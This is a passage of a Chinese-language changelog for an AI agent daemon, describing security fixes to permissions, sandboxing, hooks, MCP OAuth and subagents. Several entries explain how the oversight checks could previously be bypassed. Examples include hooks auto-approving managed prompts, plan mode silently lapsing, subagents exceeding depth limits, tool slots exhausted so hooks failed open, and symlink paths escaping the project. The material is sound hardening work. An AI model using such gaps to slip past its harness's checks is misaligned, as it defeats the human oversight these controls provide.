  改 `~/.zshrc`、`~/Library/LaunchAgents/*.plist` 不询问,无人值守也照样放行,沙箱里的 `Bash`
  能写整个家目录;`~` 是 git 仓库时它的状态进提示词,`~/AGENTS.md`、`~/.agents/skills/` 当项目
  的读进来。现在这类会话在自己的 `<状态目录>/scratchpad/sessions/<会话 id>` 里干活(子 Agent
  共用父会话的这一个):相对路径按它解析,它与状态目录下的 `scratchpad`、`memory` 写起来不询问,
  别处都按项目之外处理——写要询问、无人值守时拒绝,读家目录也要询问(或写进
  `sandbox.read_directories`)。它没有项目层:不跑 git、不找 `AGENTS.md`,没有项目级 skills、
  agents、rules、hooks。要让这类会话免询问写某个目录,写进 `sandbox.additional_directories`
  (`ARCHITECTURE.md` §3.2、§6.3)。
- **无项目会话里的"总是允许"只管本会话。** 以前 `permit_always` 的 `local` 在无项目会话里写进
  状态目录的 `settings.local.json`——那是全局层,一次回答就让所有项目、所有会话都放行这条调用。
  现在无项目会话没有"这个项目",`local` 与 `session` 一样只在本会话内生效,什么也不写。要长期
  放行,自己写进全局设置的 `permission_rules`。

#### hooks

- **未信任的项目里,用户层 command hook 不把项目里的文件交给程序。** 命令里只要有一个相对词指向
  hook 工作目录(或命令里 `cd` 去的目录)下已存在的文件或目录,这个 hook 就不跑,按 `on_error` 处理
  (缺省 warn、放行):`python3 scripts/check.py`、`node .`、`awk -f x.awk`、`sh < x.sh`,
  `.`、`./`、`..` 这样指向目录的词,展开到项目文件的未加引号的 glob / 花括号(`sh scripts/check.s?`),
  以及短选项紧跟值的写法(`node -r./x.js`、`perl -Isub/lib`)都算;`$PWD` 按 `.` 算、`$HOME` 按绝对路径算。
  **代价**:只读项目文件当数据用的 hook(`ls src`、`prettier --check .`、`grep x README.md`)在未信任的项目
  里同样不跑。改成绝对路径,或信任这个项目。详见 `hooks.md`。
- **`PreToolUse` hook 的 `approve` 答不了部署方 managed 层的 `ask`。** 以前用户层的一条 hook 回
  `{"decision":"approve"}`,managed 设置要求确认的调用就直接执行了;现在这一问照样发给宿主,
  无人值守的会话里照样拒绝。用户自己各层规则的询问,hook 照旧能答(无人值守也一样)。

#### MCP

- **stdio MCP server 的相对路径按声明它的那一层解析,不再看 daemon 从哪里启动。** 全局层的
  server 在全局配置目录启动、场景层的在场景配置目录、插件的在插件包根目录、项目层的(含
  `mcp.addServer` / `mcp.updateServer` 写进去的)在项目根;相对的 `command`(`./bin/x`)与参数里的
  相对路径(`node server.js`)都在那里解析,子进程的工作目录也是它。信任与否行为相同。以前已信任
  的项目里它们继承 daemon 的工作目录,而那不一定是这个会话的项目;0.3.10 起未信任的项目里一律用
  全局配置目录。**迁移**:写了相对路径、靠 daemon 在某个目录启动才找得到的 server,把文件放到
  声明它的那一层的目录下,或改成绝对路径。哪一层给了 server 的 `command` 就按哪一层算,项目层只
  覆盖 `env` 的全局 server 仍在全局目录启动。
- **MCP 配置与 OAuth 的几条收紧(P-4),下面加粗的会让原来能连的配置连不上。**
  - **`client_secret_env` 现在要配了 `oauth.issuer`、或配了 `allowed_authorization_servers` 且放行了
    该授权服务器,密钥才会发送**;否则 `mcp.auth.start` 报 `MCP_SERVER_DENIED` / `INVALID_PARAMS`,
    刷新、吊销与 `client_credentials` / enterprise 的令牌请求不带密钥。动态注册得到的密钥只发给注册时的
    issuer。用 `client_secret_env` 的 server,补上 `oauth.issuer`。
  - **两个 server 名映射到同一个 `mcp__<段>__` 工具名前缀时,两个都不启动**,在 `mcp.status` 里以 failed
    列出并点名对方(不改成都加哈希,那会让已经写好的权限规则失效)。给其中一个改名。
  - **command 规则先对 `command` 做词法规整(去 `.` 段与重复的 `/`,`..` 折算上一级),含 `..` 的不命中
    任何 `allowed_servers` 的 command 规则**(`denied_servers` 按折算后的路径照拦);macOS 上 command
    规则不分大小写。
  - **MCP 连接只跟随同源重定向**,跨源的 3xx 原样交回、配置的 headers 不再跨源带出去;非回环 server 的
    主机名解析不得落到回环与保留地址(私网照常)。
  - **错误信息、日志和 `mcp.status`(含 `auth.error`)里的 URL 不再带 userinfo、query 与 fragment。**
    靠这些字段读 URL 里 `?key=` 的宿主要另外保存。
  - 项目层的 server 同样不许用 `private_key_jwt.key_file`(本机私钥)和 `"grant": "enterprise"`(宿主
    交来的企业身份),与 `client_secret_env` / `key_env` 一样以 `mcp_connect_failed` 拒绝,
    `mcp.addServer` 报 `INVALID_PARAMS`。
  - 刷新令牌的刷新跨进程排队(`<哈希>.lock` 上的 `flock`),登出不会被在途的刷新写回;配了固定
    `Authorization` 头的 server 收到 401 不再把同 URL 的 OAuth 条目设成 required。
  - 内部地址的 IPv6 写法补齐(SIIT、`64:ff9b:1::/48`、Teredo 携带的 IPv4),公网 MCP server 的 OAuth
    发现不能再被引到 `169.254.169.254` 这类地址上。
- 一个 MCP server 连不上不再卡住别的项目:会话池的 MCP manager 缓存改为每个(项目, 场景)一把锁,
  `mcp.addServer` / `updateServer`、登录后重连、令牌失效降级只挡同一对;以前一个不应答的 server 能让所有
  项目的建会话、`mcp.status` 等到它的启动超时(约 90 秒)。
- **`acceptEdits` 下 MCP 工具一律询问。** 以前 server 给工具标了 `readOnlyHint: true` 就免确认,
  而这只是 server 对自己的说法,一个恶意或出错的 server 能把任何工具标成只读。要免询问的,为它写
  allow 规则(`mcp__<server>` 管整个 server,`mcp__<server>__<工具>` 管一个);`default` 下本来就要问,
  不受影响。
- **MCP 策略的 `url` 规则与 `allowed_authorization_servers` 按 URL 的各部分匹配**,与 `WebFetch` 规则
  同一个函数:主机里的通配只在主机里(`https://**` 是任何主机的根路径,要任何 URL 写
  `https://*/**`),模式不写路径时只认 `/`。写不成 `scheme://host[/path]` 的规则(`{"url": "**"}`、
  `{"url": "*.corp.example"}`)现在算写错,整份策略按读不了处理、拒绝所有 server,`daemon.doctor`
  的 `mcp.policy` 报 `failing`。用这种写法的策略改成带 scheme 与主机的模式。
- `RUST_LOG=debug` 不再把 rmcp 的授权日志(授权码、令牌)落盘:`rmcp::transport::auth` 固定在 `info`,
  用户显式写了这个 target 才放开。

#### 插件

- **`plugins.enable_on_install`(缺省 `true`,行为不变)。** 设为 `false` 时 `plugin.install` 装完不启用,
  宿主读过披露后显式调 `plugin.enable`;`plugin.install` 的结果多了 `enabled` 字段。计划在后续 0.3.x
  把缺省改成 `false`,现在就可以在 `settings.json` 的 `plugins` 段写 `"enable_on_install": false` 试跑,
  `daemon.doctor` 的 `plugins.enable_on_install` 检查在缺省值下会提示这件事。
- 披露超限的包(单行描述超 500 字符、提示词超 40 000 字符),以前只在 `plugin.install` 时拒绝,手工放进
  cache 的、旧版本装进来的照样加载;现在发现阶段也检查,超限的不加载,`daemon.doctor` 的
  `plugins.refused` 检查报出名字和原因。
- `plugin.install` 现在在临时目录里读回 manifest、检查披露,通过了才放进 cache,失败不再先放进去再删;
  同一版本已装过时,若这次给的 `checksum` 与安装时记下的压缩包 SHA-256 不一致,cache 里的会被替换。
- **插件包可以带 skill(#43)。** manifest 新增可选段 `[skills] dir = "skills"`,目录里每个
  `<名字>/SKILL.md` 是一个 skill,随包的安装、启停、卸载出现和消失,来源记为 `plugin`。只认显式
  写了这一段的包:已经装着、恰好带 `skills/` 目录却没写这一段的包,升级后行为不变。skill 用裸名,
  磁盘上同名的 skill 优先,被遮住的在 `plugin.list` 新增的 `skill_conflicts` 里报出(另有 `skills`
  列出包带的 skill 名);`plugin.install` 的 `disclosure` 多了 `skills`,skill 的描述和正文进
  `model_visible`,受同样的 500 / 40 000 字符上限约束。`SKILL.md` 校验从严,一个不过整包拒装
  (`plugin_packages.md`「包里的 skill」)。以前把包里的 skill 拷进实例 skill 目录的宿主,改成在
  manifest 里声明之后删掉拷贝,否则磁盘那份会遮住包里的。

#### 设置文件

- **`session_dir` 已弃用。** 它从来不读(transcript 总在状态目录下),现在设置文件里写了它,加载时
  每个写了它的文件记一条 warn;settings schema 里标了 `deprecated`。删掉这一行即可,行为不变。
  计划在之后的版本里删除这个字段。
- **`docs/schemas/settings.schema.json` 与加载时的行为对上了。** 以前这份 schema 要求顶层的 `model`、
  `paths`,`model` 里的 `api_type` / `base_url` / `model_name` 等,`sandbox` 里的 `deny_read`、
  `allowed_domains`,`execution` 里的 `max_parallelism`、`max_api_calls_per_turn`,而一个设置文件是
  叠在内建缺省上合并的,这些都可以不写:空文件、只写 `{"sandbox": {…}}` 或只配 `providers` 的文件
  在编辑器里都被标成错。现在缺省值已有的字段一律可选;列表与表里的条目(`permission_rules` 的
  一条、`scripts` 的一条)照样要写全,因为它们不跟缺省合并。另外:
  - `paths` 不在 schema 里了。它从来不从设置文件读(加载时整段去掉),现在写了它的文件加载时记一条
    "settings key not recognised" 的 warn,`daemon.doctor` 的 `settings.tiers` 在 `unknown_keys`
    里列出 `paths`。删掉这一段即可,行为不变。
  - `permission_mode` 的取值里去掉了 `bubble`:写进设置文件的 `bubble` 一直被退回 `default`,schema
    以前却收它。
  - schema 里几处字段说明改成实际行为:`sandbox` feature 缺省是开的;`bypassPermissions` 照样拒凭据、
    照样受 managed 层的 deny / ask;`acceptEdits` 写项目里的 `.git` / `.agix` / `.claude` /
    `.agents/skills` 照样询问;状态目录只有 `scratchpad`、`memory` 可写;`deny_write` 的内置名单里
    没有 `.agix`;`deny_read` 写了非空的列表就整份替换内置名单。

#### 工具

- **`NotebookEdit` 输入解析失败时改为询问**(以前放行;`validate_input` 先拦住非法输入,所以此前没有
  可利用的路径,现在不再依赖那个先后)。它的拒绝消息少了 `path safety: ` 前缀,与 Write / Edit 一致;
  按这段文字匹配拒绝原因的宿主改匹配后半。
- **`Read` / `Glob` / `Grep` 经符号链接后接 `..` 读到项目外时,现在要询问**(`link/../secret` 以前被
  词法规整成 `<项目>/secret` 而免询问,实际打开的是链接指向目录的上一级);读到项目外的 `Read` 结果
  也同样加上外部内容的围栏。`acceptEdits` 与 `default` 一致。
- 外部内容围栏的收尾标签转义不再区分大小写,带空白的变体也转义。
- `ExitPlanMode` 的结果不再对模型说 `allowed_prompts` "已获批准"(它从来没加过规则):现在写明每次调用仍然
  询问。

#### 模型、回合与压缩

- 自动压缩一次没能缩小对话(无可丢弃、`PreCompact` hook 拒绝、压缩器出错)之后,接下来的几步不再
  自动压缩:连续第 n 次落空后跳过 2ⁿ 次(最多 32 次)该压缩的检查,对话比落空时又长出阈值的十分之一
  就提前再试;压缩成功清零。以前每一步都重试一遍,开了 LLM 摘要时每一步都多一次摘要调用。出错不再
  被吞掉,记一条 warn。
- OpenAI 兼容协议的流被截断时,参数为空或不完整的工具调用转成 `MalformedToolUse`,不再用 `{}` 去执行工具
  (Anthropic 协议的流不走这条)。
- 服务端要求的重试等待超过 60 秒就放弃重试(以前过大的 `retry-after` 会回绕成很短的等待)。
- 中断落在摘要请求的流上时,压缩原样放弃、对话原样留着,不再退回 Snip 丢掉两轮。
- 回合末的记忆抽取不再在会话停下之后接着跑:引擎退出时最多等它 3 秒,过了就中止并记 warn
  (短于会话池等旧引擎的 5 秒宽限)。
- 启动时还不存在的 agent 类型目录(项目第一次建出 `.agix/agents/`,全局、场景层同理)里后来写进的
  类型能用上了:下一次有请求用到这一对配置(建会话、`commands.list` 等)时按新出现的目录重载,
  运行中的会话在下一轮之前重建,这个目录此后也被监视。以前只有显式 `config.reload` 或重启才看得到。

#### 会话与存储

- `append` 被取消时,history 写完这一行才放锁(以前锁随 future 先放掉,下一次 `append` 会把还在写的
  半行当崩溃残行截掉,transcript 中间出现坏行);落盘改为先 fsync 再 rename,cron 存储的空文件当作空列表。

#### 遥测

- 遥测文件写入不跟随符号链接(`O_NOFOLLOW`,不再 chmod 链接目标);OTLP 导出带 10 秒超时,关停时
  `shutdown_all` 与 exporter 的 flush 各有 10 秒上限,第二次 Ctrl-C / SIGTERM 直接退出(130)。

#### 子 Agent 与团队

- 后台子 Agent 与常驻团队成员的调用记录也带 `parent_session_id` 与 `agent_type`(以前只有前台委派写);
  `TeamCreate` 的成员与常驻成员一样按收紧后的模式拿权限。
- **`context: fork` 的 skill 按自己的 `allowed-tools` 收窄子 Agent 的工具。** 以前 fork 出的子 Agent
  拿到父会话的全部工具,`allowed-tools: Read` 的 fork 照样有 `Write`、`Edit`、`Bash`;现在只给列出的
  工具名(`Bash(cargo test:*)` 给的是 `Bash`,能不能跑哪条命令仍按权限判),子会话自己注册的
  `Skill`、`Agent`、`Task*` 这类也一样收窄。没写 `allowed-tools` 的不收窄。未信任项目里这些条目
  不授权,但照样收窄。
- **Skill fork、`TeamCreate` 成员与 agent hook 起的子 Agent 按 agent 类型收窄工具。** 以前这几条路径
  不看 agent 类型,`agent: explore` 的 fork 照样拿到 `Write`、`Edit`、`Bash`,
  到了 `max_agent_depth` 还拿着父会话的 `Agent`,能越过深度上限再起一层。现在它们和模型调 `Agent`
  一样:先按类型的 `allowed_tools` / `disallowed_tools`,再按调用方的列表,`Agent` 不继承。
- 子 Agent 只继承父会话建的时候拿到的那批工具,不再继承父会话的引擎、模块注册的工具:`Skill`、
  `Team*`、`Task*` 这类由子会话自己再注册一份(以前同名的两份并存,分发只认第一个,即父会话的);
  `ListMcpResources`、`ReadMcpResource`、`MCP` 三个 MCP 工具子 Agent 不再有。
- **agent 类型的 `mcp_servers` 真正生效。** 以前授予的 MCP 工具不宣告给子 Agent 的模型,只有第一批
  调用能打到 server,之后就是 `Tool not found`。现在子 Agent 拿到父会话连接按 server 收窄出的一份:
  工具从第一次请求起宣告、随 server 的变更通知刷新,这些 server 的说明、`/mcp__…` prompt 命令与
  `@server:` 资源引用也一并可用;没授予的 server 照旧看不到。`session.startAgent` 的
  `allowed_tools` / `disallowed_tools` 对授予的 MCP 工具同样生效。
- **agent hook 不占 `execution.max_concurrent_subagents`。** 以前 hook 起的子 Agent 与模型的 `Agent`
  调用抢同一份名额,模型用后台子 Agent 占满名额后,`PreToolUse` 上的 agent hook 起不来,按执行失败
  走 `on_error`(缺省放行),什么都不拦。现在它不占名额,模型占满了照样判。代价是 hook 起的子 Agent
  自己的事件(它的工具调用、它的 `SubagentStart` 等)不再起 agent hook:这条按执行失败处理、走
  `on_error`,command / prompt / http hook 照旧跑。以前它们会一层套一层地起 agent hook,直到名额
  用完。
- **一次性子 Agent 不做记忆抽取。** 前台、后台、`session.startAgent`、skill fork、`TeamCreate` 成员与
  agent hook 起的子 Agent,回答一交就被丢掉,以前每次结束都发出一次记忆抽取的模型请求、随即中止,
  照样计费、什么也没写进记忆。现在不发;它们读记忆照旧。常驻团队成员不受影响。

### RPC 客户端

#### 权限与计划模式

- `session.resume` 的 `permission.prompts` 在 `bypassPermissions` 会话里不再一律是 `false`:
  managed 层有 `ask` / `deny` 规则或关掉了 bypass 时报 `true`,这样的会话仍会发 permission
  `prompt` 帧。看到 `bypassPermissions` 就不接询问的宿主,改看 `prompts`。
- **会话原地重建之后还在 `plan` 模式里。** 设置变化(`config.reload`、设置文件被改)、换厂商的
  `session.setModel`、`session.setPrompt` 让空闲会话在下一轮前重建引擎,以前重建出来的会话回到
  设置里的模式(`EnterPlanMode` 进的 `plan` 悄悄失效),todo 列表、`ToolSearch` 加载过的 deferred
  工具、读过的文件记录(`Edit` 前要先 `Read` 的依据)和 `/rewind` 的文件快照也都丢了;现在都留着。
  `plan` 里退出回到的是进入 `plan` 之前的模式;不在 `plan` 里的会话直接换成新设置的模式。
- **被驱逐、daemon 重启后恢复的会话也还在 `plan` 模式里。** 以前会话被 `--session-cap` 挤出池子
  或空闲超时回收后,下一轮从转录恢复出来的是设置里的模式和空的 todo 列表:`EnterPlanMode` 进的
  `plan` 悄悄失效,下一轮的 `Write` 不经 `ExitPlanMode` 询问就落盘。现在 `plan` 模式、退出后回到
  的模式和 todo 列表在每轮结束时有变化就记进转录(新扩展条目 `agix.session_state` / `change`,
  格式见 `ARCHITECTURE.md` §4),恢复时读回来。`session.entries` 不列 `agix.*`,导出的
  `transcript.jsonl` 里看得到它;只认识旧条目的工具照"未知 `ns` 跳过"处理即可。
- managed 层的 `ask` 不再被 `PreToolUse` hook 的 `approve` 吞掉:配了这种 hook 的会话,也会收到
  managed 规则要求的 permission `prompt` 帧,宿主要能回答。
- `project_root: null` 的会话的工具以 `<状态目录>/scratchpad/sessions/<session_id>` 为工作目录,
  `Bash` 的 `pwd`、相对路径都落在这里;以前是状态目录的上一级(通常是家目录)。写家目录里的文件
  现在会发 permission `prompt` 帧(无人值守的场景直接拒绝)。要模型去处理用户文件的宿主,传
  `project_root`,或在 `options.permission_rules` / 设置里为那几个目录写 allow
  (`daemon_rpc_protocol.md` §3.1)。
- 无项目会话里回答 `{"type":"permit_always","scope":"local"}` 不再写盘,效果同 `scope: "session"`
  (`daemon_rpc_protocol.md` §4.7)。
- `options.permission_rules` 里 `WebFetch` / `Ping` 的 `rule_content` 按 URL 的各部分匹配
  (`daemon_rpc_protocol.md` §4.6):传 `scheme://host[:port][/path]` 形状的模式;别的写法作 `allow`
  只放行原样相等的 URL。

#### 方法、帧与错误

- `daemon.doctor` 的 `health.checks` 多一项 `settings.managed`(查找的路径、是否存在、来源与
  内容);`config.get` 的回答多一个 `managed` 字段(`tier: "effective"` 时为 managed 层,否则
  `null`)。
- `daemon.doctor` 报三项安全姿态:`settings.permission_mode`(会话缺省是 `bypassPermissions` / `auto` /
  `yolo`)、`settings.hooks_fail_open`(`PreToolUse` / `UserPromptSubmit` / `Stop` 上 `on_error` 缺省放行的
  hook)、`build.panic`(构建为 abort,工具 panic 的兜底不生效)。另外 `sandbox.unattended_network`
  的告警见"部署 `agixd` 的"。
- **新增帧:一行不是合法 JSON 时,服务端回
  `{"jsonrpc":"2.0","id":null,"error":{"code":-32700,"message":"Parse error"}}`**
  (unix socket、TCP、WebSocket 都是),连接不断。以前这样的行被静默丢弃。宿主的读循环要容得下
  一个 `id` 为 `null` 的错误帧(它不对应任何在途请求)。
- **新增帧:合法 JSON 但不是合法请求的帧(缺 `method`,或字段类型不对,如 `"jsonrpc":2.0`、
  `"method":42`),只要带着字符串或数字的 `id`,就回 `INVALID_REQUEST (-32600)`**,`id` 原样带回,
  `message` 是 `Invalid Request: ` 加上读不出来的原因。以前这样的帧什么也不回,发请求的客户端等
  这个 `id` 会一直等下去。没有 `id`、`id` 是 `null` 或别的类型、或者带着 `result` / `error`
  (形状是响应)的,仍然不回。以前没处理过 `-32600` 的客户端,按别的错误码一样处理就行。
- **`options.permission_rules` / `options.prompt_types` 逐条读。** 以前其中一条读不出来(如
  `"behavior": "allwo"`),整个字段被忽略,同一列表里的 `deny` 规则也跟着失效;现在只忽略那一条,
  `ignored_options` 里的 `field` 写成 `permission_rules[0]` 这样带下标。按字段名匹配
  `ignored_options` 的宿主要容得下带下标的写法。
- **新增 `options.strict`(capability `strict_options`)。** `session.create` / `session.run_turn` /
  `session.resume` 的 `options` 里写 `"strict": true`,读不出来的字段或值报 `INVALID_PARAMS`,
  `error.data.invalid_options` 与 `ignored_options` 同形;缺省不变。计划中的"缺省严格"就是把它
  变成缺省,现在打开它就能提前发现拼错的字段。
- `session.resume`、`session.run_turn` 调回一个刚被关闭或驱逐的会话时,它上一个引擎若在 5 秒宽限期
  内还没停下(卡在一个不理会取消的 hook 里之类),返回 `SESSION_BUSY`(`data` 为
  `{session_id, current_turn_id: null}`),稍后重试即可。以前只记一条 warn 就照常起新引擎,两个引擎
  会写同一份转录。
- **转录读不出来的会话不再被当成新会话。** `session.resume`、`session.run_turn` 调回一个会话时,
  转录文件在但读不出来(权限不够、中间有不是 UTF-8 或不是合法 JSON 的整行),以前当作"没有历史":
  `run_turn` 以空上下文接着跑,还往那份转录里再写一条 `Meta`;带 `create_if_missing: false` 的
  `session.resume` 报的是 `SESSION_NOT_FOUND`。现在一律返回 `INTERNAL_ERROR`,`message` 含
  "transcript could not be loaded" 和读盘错误,不起引擎、不往转录写任何东西,带不带
  `create_if_missing` 都一样;`SESSION_NOT_FOUND` 只表示转录文件不存在。崩溃截断的最后半行
  (没有换行结尾)仍按原规则丢掉,不算读不出来。
- **新增帧 `tool_progress`**(能力位 `tool_progress`):运行中的工具调用报的进度,
  `{tool_use_id,name,message,progress?,total?,dropped}`,落在这次调用的 `tool_use` 与 `tool_result`
  之间。每次调用每秒至多一帧,`dropped` 是合并掉的条数;不进 transcript,不保证送达。内建工具里
  目前只有 `Bash` 报(每行输出一次,`progress` 是行数);子 Agent 的包在 `subagent_progress` 里
  (协议 §7.3)。不认识它的客户端照约定忽略即可。`progress`、`total` 是整数值时发成 JSON 整数
  (`42`,不是 `42.0`),只有工具报的本来是小数时才带小数部分;按浮点数读的客户端两种都接得住。
- `RunCode` 程序里调用的工具不再发 `tool_progress`。以前程序里的 `Bash` 照样报,帧上的
  `tool_use_id` 是 `<RunCode 的 id>.1` 这样宿主从没见过的 id;程序的进度仍以它任务的
  `task_progress` 推出(协议 §7.3)。
- 后台 `Agent` 调用起的子 Agent,`subagent_progress` 帧里的 `parent_tool_use_id` 与引擎事件的
  `parent_session_id` 不再是空值(以前是 `null` / 空,`AgentSpawned` 遥测的 `parent_turn` 也记成 0)。
- 新增机器可读的 JSON-RPC 描述 `docs/schemas/rpc.schema.json`:方法名、`session.event` / `daemon.event` 的
  `kind`、错误码表与请求 / 响应 / 错误帧,已有强类型的 params(目前只有 `session.startAgent`)带 schema,
  其余标"未类型化"。由 `cargo test -p assembly write_rpc_schema -- --ignored` 生成,可以拿去生成客户端。
- **`session.interrupt` 落在刚提交的那一轮上。** 以前上一轮结束后、引擎还在收尾或重跑
  `async_rewake` hook 时提交下一轮再中断,`interrupted` 报 `true`,中断却打在上一轮上:新的一轮照常
  跑完,上一轮起的 `Monitor` / 后台 `Agent` / 后台 `RunCode` 任务反被停掉。现在新的一轮以
  `cancelled` 结束,上一轮的后台任务不受影响。中断仍会停掉被中断那一轮自己起的后台任务(协议
  `session.interrupt`)。
- **目标轮的两头,中断也落在那一轮上。** 以前目标轮报了 `turn_started`、还在把认领记进转录时
  中断,`interrupted` 报 `true`,取消的却是上一轮(连带它的后台任务),目标轮照样调模型;一轮
  答完、还在记目标时中断,同样打在这一轮已经结束的令牌上,下一个目标轮照开。现在中断只认
  `turn_started` 报的那个 `turn_id`:前一种以 `cancelled` 结束、不调模型;后一种这一轮的后台任务
  不受影响,目标解除武装,不再开下一轮。**中断一律让目标解除武装**(以取消结束的一轮本来就会),
  要继续用 `session.updateGoal {action:"resume"}`。
- **重建时旧引擎停得慢,会话不再卡死。** `session.setPrompt`、换厂商的 `session.setModel` 让会话
  原地重建,旧引擎 5 秒内没停下时返回 `SESSION_BUSY`;以前选择照样记进了转录,已取消的旧引擎却
  还留在池里,下一轮的消息发给它,`run_turn` 永远不返回。现在这次选择不生效、不记录,会话移出
  内存(`daemon.event` `session_evicted` 多了 `reason: "rebuild"`),下一轮等旧引擎停下后从转录恢复。
- **`session.close` / `session.delete` 截断的一轮有终止帧了。** 以前旁观这一轮的订阅者什么也收
  不到(违反 §5.5),发起者的 `run_turn` 还可能返回成功。现在其他订阅者收到这一轮的
  `error{code:"session_closed"}`,发起者收到 `ENGINE_ERROR`,`message` 以 `session_closed:` 开头;
  关闭前已经推出 `turn_complete` 的一轮不受影响。
- **请求因过长被拒、为重试而压缩时中断,以 `cancelled` 结束。** 以前这一轮报 `ENGINE_ERROR`。
- **`session.compact` 写摘要时可以中断。** 以前 `session.interrupt` 报 `true` 却不起作用,摘要
  写完照样替换历史;现在历史不变,这一轮以 `turn_complete{stop_reason:"cancelled"}` 结束。
- **停掉后台 fork 的 skill,这一轮照常继续。** `context: fork` + `background: true` 的 skill 以前直接
  用这一轮的取消令牌当任务令牌,`session.stopTask` / `TaskStop` 停它会连带取消整轮(`Bash` 回
  "已取消",以 `cancelled` 结束)。现在它和后台 `Agent` 一样挂在这一轮的子令牌上:停它只停它,
  中断这一轮仍会连带停掉它。
- **被中断连带停掉的后台子 Agent 报 `stopped`。** 以前 `session.interrupt` 停掉的后台 `Agent`、
  后台 fork 的 skill,任务状态报 `done`,父会话还收到一条 `<status>done</status>` 的通知;现在
  `session.tasks` / `task_finished` 里是 `stopped`,通知的 `status` 是 `stopped`。常驻团队成员被停下
  时处理中的那条消息同样记 `stopped`。`stopTask` 停掉的仍不发通知。

#### 其他

- `config.get` 在 `tier: "effective"` 时,`settings.session_dir` 是 `null`(以前是 daemon 启动时塞进去的
  本地数据目录)。这个字段本来就不读,见"`session_dir` 已弃用"。

### 嵌入方

#### 权限与 managed 设置

- `base::interface::config_source::Tier` 多了 `Managed`;`ConfigSource` 给出的 `Tier::Managed`
  层由 `Settings::load_from` 按 managed 层读(只认上面两个键),不进普通合并。对 `Tier` 做
  穷尽 `match` 的要加一支。
- `Settings` 多了 `managed: Option<base::managed_settings::ManagedSettings>`(`serde(skip)`);
  逐字段构造 `Settings` 的要补 `managed: None`。`Settings::apply_managed` 把一层 managed 设置
  放到已加载的设置上。
- `DaemonConfig::managed_settings_path`:不设时读系统路径。`assemble::pool` 读一次,套到会话池
  加载的每一份设置上;已经带着 managed 层的 `config.settings` 在没有文件时保留它。
- `RuleSource::priority()` 对 `PolicySettings` 返回 70(以前是 10):`PermissionRule.source` 为
  `policySettings` 的规则在同样具体的命中里先被报出,裁决不变。按这个数值排序或比较的嵌入方留意。
- `PermissionGate::with_managed(permissions::gate::ManagedPolicy)`;
  `RuleSetPermission::from_settings` 自动接上设置里的 managed 层。自己拼 gate 的嵌入方要接上
  它,否则 managed 规则只按普通规则生效、在 bypass 下不生效。
- 有 managed 层时,`Assembly.permission` 不再替换 `bypassPermissions` 会话的 gate。
- `PermissionOutcome::Prompt` 多了 `managed: bool`:为真时是 managed 层在问,`PreToolUse` hook 的
  `approve` 不答它。自己实现 `Permission` 的构造 `Prompt` 时补 `managed: false`(或按
  `PermissionGate::asked_by_managed(decision_reason)` 填);不带 `..` 解构 `Prompt` 的要加 `..`。
  gate 在 managed 层也问的调用上,`Ask` 的 `decision_reason` 报的是 managed 那条规则。
- URL 规则的匹配收进 `base::url_rule` 一份:`NormalizedUrl::parse` 规整 URL,`UrlPattern::parse`
  编译 `scheme://host[:port][/path]` 模式,`url_rule::matches(pattern, url)` 一步到位。`RuleSet::evaluate`
  对 `WebFetch` / `Ping` 用它;`mcp::policy` 的私有 `normalized_url` 删除;`tools::security::allowed_domains_name`
  经它取主机。`permissions::dangerous::is_unscoped_grant(tool_name, content)` 是"这条授权是否和整类
  授权够得一样远"的判断(危险规则告警用它),`is_unscoped_grant_in(tool_name, content, project_root)`
  再要求路径类授权落在项目根之内(skill 授权过滤用它)。`UrlPattern::host_is_open` 改按公共后缀列表判
  (新模块 `base::public_suffix`,列表随源码带着);`url_rule::literal_pattern` 把一个 URL 写成只匹配
  它自己的规则内容,`permissions::ruleset::literal_rule_content` 与 `settings_patch::build_rule_string`
  记"永久允许"时用它。`UrlPattern::parse` 拒绝带 `?` / `#` 的模式。
- 路径规整与根目录包含判断收进 `permissions::path_rule` 一份:`permissions::path_safety` 与
  `tools::security` 里各自的 `normalize_path_lexically` 删除,改用 `path_rule::normalize_path_lexically`;
  两个同名 `is_path_within_root` 按语义改名——按组件比字面的是 `path_rule::is_within_root_lexical`,
  两边先 canonicalize 再比的是 `path_rule::is_within_root_resolved`。直接调这几个函数的要改路径,
  并选对语义(经符号链接指出根目录的路径,lexical 算在内、resolved 算在外)。Write / Edit /
  `NotebookEdit` 共用 `security::check_write_permission`。

#### 其他签名与行为变化

- `assembly::session_pool::ResumeError` 多了 `Busy { session_id, message }` 变体(没有
  `#[non_exhaustive]`):对它做穷尽 `match` 的要加一支。daemon 把它报成 `SESSION_BUSY`、
  `data.current_turn_id` 为 `null`。
- `tools::security::canonicalize_best_effort` 搬到了 `permissions::path_rule::canonicalize_best_effort`,
  与同批搬走的两个路径函数一起改路径。
- `assembly::plugins::PluginSubsystem::health_check()` 返回 `Vec<Arc<dyn HealthCheck>>`(以前是
  `Option<Arc<_>>`):插件子系统现在报 `plugins.enable_state`、`plugins.refused`、
  `plugins.enable_on_install` 几项。拿它 `if let Some` 的改成遍历。
- 新增的公开字段,用结构体字面量构造的要补上:`base::settings::PluginsConfig::enable_on_install`
  (缺省 `true`)、`McpOAuthConfig::issuer`(`None`)、`plugin::manifest::PluginManifest::skills`
  (`None`)、`plugin::disclosure::Disclosure::skills`(`Vec::new()`)、
  `permissions::shell::Segment::written`、`assembly::DaemonConfig::managed_settings_path`(`None`)。
- `permissions::rule::rules_from_all_tiers` 现在也含 managed 层的规则(报成 `policySettings`);
  只想要用户各层规则的,按规则的 `source` 过滤。
- `tools::security::read_allowed` 对凭据位置一律返回 `false`,`sandbox.read_anywhere` 开着也一样。
- `MemoryStore` 的写入与删除要先拿记忆目录的 `DirLock`,拿不到时返回
  `MemoryError::Io`,以前是进程内互斥、不会失败。

#### 插件、工具与进度

- 插件作者:`runtime::plugin::Registrar::admit_tools(pattern)` 让插件自己登记的工具穿过场景的
  `tools` 白名单(`mini`、`harnix` 这类场景以前会把它们全部拿掉);场景的 `disallowed_tools` 仍然
  优先,pattern 碰不到内建工具和别的插件的工具。只新增:不调它的插件、现有场景的意思都不变。
  被场景策略拿掉的工具现在记一条 `debug` 日志。为此包装每个 `Scene` 的宿主可以改用它
  (`plugin_development.md`「场景的工具白名单」)。
- **工具作者:推荐实现 `Tool::spec()`(B19a 第一步)。** `ToolSpec` 收进与调用输入无关的描述与能力
  (`name`、`description`、`source`、`read_only`、`concurrency_safe`、`destructive`、`deferred`、
  `callable_from_code`、`permission_content_kind` ……),一个方法替代逐个覆写十几个能力方法;按输入判断的
  (`is_read_only(input)` 一类)照旧再覆写。**旧方法仍然可用,没有 deprecate**:现有的 `impl Tool` 一个不用
  改,行为不变;`spec()` 缺省从旧方法读出,旧方法缺省取 `spec()` 的字段。包另一个 `Tool` 的包装器只需转发
